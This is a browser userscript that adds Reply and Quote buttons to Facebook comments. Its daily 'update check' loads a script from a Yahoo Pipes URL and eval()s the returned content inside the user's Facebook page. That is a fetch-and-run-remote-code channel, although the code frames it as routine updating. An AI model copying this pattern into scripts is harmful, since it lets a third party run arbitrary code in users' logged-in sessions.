(function () {
// ==UserScript==
// @name           facebook.com - Reply button FIXER
// @version        2.6
// @description    Add a reply button to comments
// @namespace      http://www.krakenstein.cz.cc
// @author         daYOda (Krakenstein)
// @original       Kub4jz.cz <kub4jz> @ http://userscripts.org/scripts/show/49378
// @include        http://*.facebook.com/*
// @match          http://*.facebook.com/*
// @exclude        http://apps.facebook.com/*
// @exclude        http://www.facebook.com/apps*
// ==/UserScript==

var gm_class = ' gm_reply_button_fix';
var button_text = 'Reply', quote_text = 'Quote';
var last_insert = '';
var t2, t1;
var uname, txtarea;
var dom = "DOMNodeInserted";
const myParent_Id = "globalContainer";
const DEBUG = false;
const LOG_PREFIX = 'YOD Reply: ';
var DBG_EL;

function c1(q,root){return document.evaluate(q,root?root:document,null,9,null).singleNodeValue;}
function g(id){if(id&&typeof id==='string'){id=document.getElementById(id);}return id||null;}

const yodUpdate = {
  script_id : 82308,
  script_version : '2.6',
  script_pipeId : '7015d15962d94b26823e801048aae95d',
}

function setValue(key, value) {
  localStorage.setItem(key, value);
  return false;
}

function getValue(key) {
  var val = localStorage.getItem(key);
  return val;
}

function usoUpdate(el) {
  const s_CheckUpdate = 'YodCheckUpdate' + yodUpdate['script_id'];
  var md = parseInt(new Date().getDate());
  var CheckUpdate = parseInt(getValue(s_CheckUpdate));
  var NeedCheckUpdate = false;
  if (CheckUpdate !== md) {
    setValue(s_CheckUpdate, md);
    el = el ? el : document.body;
    if (el) {
      if (!document.getElementById(s_CheckUpdate)) {
        var s_gm = document.createElement('script');
        s_gm.id = s_CheckUpdate;
        s_gm.type = 'text/javascript';
        s_gm.innerHTML = 'function go' + s_CheckUpdate + '(itm){if(itm.value.items.length){return eval(unescape(itm.value.items[0].content).replace(/&lt;/g,\'<\').replace(/&gt;/g,\'>\').replace(/&amp;/g,\'&\'));}}';
        el.appendChild(s_gm);
      }
      var s_gm = document.createElement('script');
      s_gm.type = 'text/javascript';
      var sSrc = 'http://pipes.yahoo.com/pipes/pipe.run?_id=' + yodUpdate['script_pipeId'];
      sSrc += '&_render=json&_callback=go' + s_CheckUpdate;
      sSrc += '&id=' + yodUpdate['script_id'] + '&ver=' + yodUpdate['script_version'];
      //sSrc += '&redir=yes';
      s_gm.src = sSrc;
      el.appendChild(s_gm);

      NeedCheckUpdate = true;
    }
  }
  else {
    setValue(s_CheckUpdate, md);
  }

  return NeedCheckUpdate;
}

function log(m) {
  if(DEBUG && m) console.log(LOG_PREFIX + m.toString());
}

function gBox(el) {
  var textarea = el.getElementsByTagName("textarea");
  if (!textarea.length) return gBox(el.parentNode);
  else return textarea.item(0);
}

function insertName(el, qt) {
  var actname, textarea, insert_text = '', squote, sRoot, sShow, parent = el.parentNode.parentNode;
  if (!(actname = c1('.//a[contains(@class,"actorName")]', parent))) return;
  else actname = actname.innerHTML.trim();
  //if (actname) actname = actname.split(' ')[0]; //only first name
  if (qt && (squote = c1('.//span[contains(@data-jsid,"text")]', parent))) {
    if ((sRoot = c1('.//*[contains(@class,"text_exposed_root")]', squote)) && (sShow = c1('.//*[contains(@class,"text_exposed_show")]', squote))){
      squote = sRoot.innerHTML.trim() + sShow.innerHTML.trim();
    }
    else
      squote = squote.innerHTML.trim();
    squote = squote.replace(/<[\/]{0,1}span[^><]*>/ig, '').replace(/(<a([^>]+>)|<\/a>)/ig, '').replace(/<br(?:\s\/|)>/ig, ' ');
  } else squote = '';

  DBG_EL.innerHTML = squote;
  insert_text = '@' + actname + ' ; ' + DBG_EL.textContent + '\n';
  //insert_text = '@' + actname;
  if (textarea = gBox(parent.parentNode)) {
    textarea.focus();
    if (textarea.value == '') { last_insert = null; }
    if (insert_text !== last_insert) {
      textarea.value += insert_text;
      last_insert = insert_text;
    }
  }
}

function addButtons(ev) {
  if (ev) {
    log('el2: -> ' + ev.target.tagName);
    if(!(/(EMBED|INPUT|UL|LI|DIV)/g.test(ev.target.tagName))) {
      //log('reBoot: 2 -> ' + ev.target.tagName);
      if(t2) clearTimeout(t2);
      return reBoot();
    }
  }
  if (!uname) uname = get_uname();
  var divs = document.getElementsByClassName("commentActions");
  var gm_class_length = document.getElementsByClassName(gm_class);
  var divs_length = divs.length;
  if (divs_length != gm_class_length) {
    for (i = 0; i < divs_length; i++) {
      var div = divs.item(i);
      if (div.className.indexOf(gm_class) >= 0) {
        continue;
      } else {
        div.className += gm_class;
      }
      var actname, parent = div.parentNode.parentNode;
      if (!c1('.//span[contains(@class,"saving_message")]', parent)) continue;
      if (actname = c1('.//a[contains(@class,"actorName")]', parent)) {
        actname = actname.innerHTML.trim();
        if (actname == uname) continue;
      } else continue;
      var div2 = document.createElement('div');
      var button = document.createElement('a');
      button.textContent = button_text;
      button.addEventListener("click", function(){insertName(this)}, false);
      div2.setAttribute('style',"border:0;float:right;padding-right:10px;");
      div2.appendChild(document.createTextNode('-[ '));
      div2.appendChild(button);
      div2.appendChild(document.createTextNode(' | '));
      var button = document.createElement('a');
      button.textContent = quote_text;
      button.addEventListener("click", function(){insertName(this, true)}, false);
      div2.appendChild(button);/**/
      div2.appendChild(document.createTextNode(' ]-'));
      parent.appendChild(div2);
    }
    if(t2) clearTimeout(t2);
  }
  return false;
}

function get_uname() {
  if (uname) return uname;
  else if (uname = c1('.//a[contains(@class,"headerTinymanName")]')) {
    return uname.textContent.trim();
  }
}

function doInject(ev) {
  log('el1: -> ' + ev.target.tagName);
  t2 = setTimeout(function() { addButtons(ev); }, 1000);
}

function reBoot() {
  var myContent = g(myParent_Id);
  if (myContent) {
    if(t1) clearTimeout(t1);
    myContent.removeEventListener(dom, doInject, false);
    return Boot();
  }
}

function starter() {
  var myContent = g(myParent_Id);
  if (myContent) {
    DBG_EL = document.createElement('div');
    myContent.addEventListener(dom, doInject, false);
    if(t1) clearTimeout(t1);
  }
  return false;
}

function Boot() {
  t1 = setTimeout(starter, 2000);
}

usoUpdate();
addButtons();
Boot();
})();